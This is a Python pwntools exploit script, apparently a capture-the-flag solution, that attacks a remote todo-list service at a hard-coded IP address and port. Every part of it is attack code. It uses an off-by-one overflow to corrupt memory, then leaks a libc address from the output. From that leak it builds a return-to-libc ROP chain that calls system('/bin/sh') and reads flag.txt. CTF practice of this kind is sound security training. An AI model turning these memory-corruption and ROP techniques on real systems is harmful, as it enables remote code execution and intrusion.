from pwn import ELF, ROP, context, p8, p64, remote, u64


context.arch = "amd64"

MAX_TODOS = 32
MAX_STRING_LENGTH = 128
BUFFER_SIZE = MAX_TODOS * (MAX_STRING_LENGTH + 8) + 8

P = remote("10.212.173.64", 32_213)


def menu_choice(choice: int) -> None:
    P.sendlineafter(b"Enter your choice: ", str(choice).encode())


def add_todo(payload: bytes) -> None:
    menu_choice(0)

    print(P.recvuntil(b"Enter your new todo (max " + str(MAX_STRING_LENGTH).encode() + b" chars): ").decode())
    P.send(payload)
    print(P.recvuntil(b"Added! Your todo was saved.").decode())


def view_todo(idx: int) -> bytes:
    menu_choice(1)

    P.sendlineafter(b"Enter the index of the todo to view: ", str(idx).encode())
    print(P.recvuntil(b"Todo #").decode())
    print(P.recvuntil(b": ").decode())
    return P.recvline()


def edit_todo(idx: int, payload: bytes) -> None:
    menu_choice(3)

    P.sendlineafter(b"Enter the index of the todo to edit: ", str(idx).encode())
    print(P.recvuntil(b"Enter the new text for todo #").decode())
    P.sendafter(b": ", payload)
    print(P.recvuntil(b"Todo updated.").decode())


def main() -> None:
    payload = b"A" * MAX_STRING_LENGTH
    payload += p8(0x81)

    add_todo(payload)

    payload = b"B" * MAX_STRING_LENGTH
    payload += p8(0x20) * 2

    edit_todo(0, payload)

    leak = view_todo(0)
    leak = leak[BUFFER_SIZE:].rstrip(b"\x00")
    leak_length = len(leak)
    pad_length = (8 - leak_length % 8) % 8
    leak += b"\x00" * pad_length

    libc_candidates: list[int] = []

    for idx in range(0, len(leak) - 7):
        candidate = u64(leak[idx : idx + 8])

        if 0x700000000000 <= candidate < 0x800000000000:
            libc_candidates.append(candidate)

    libc = ELF("./libc.so.6")
    libc.address = libc_candidates[1] - 0x2A1CA
    system_addr = libc.symbols["system"]
    binsh_addr = next(libc.search(b"/bin/sh"))

    rop = ROP(libc)
    ret_addr = rop.find_gadget(["ret"])[0]
    pop_rdi_ret_addr = rop.find_gadget(["pop rdi", "ret"])[0]

    payload = p64(pop_rdi_ret_addr)
    payload += p64(binsh_addr)
    payload += p64(system_addr)
    payload += p8(0x0) * 144
    payload += p64(ret_addr)
    payload += b"\n"

    edit_todo(0, payload)

    P.sendline(b"cat flag.txt")

    P.interactive()


if __name__ == "__main__":
    main()
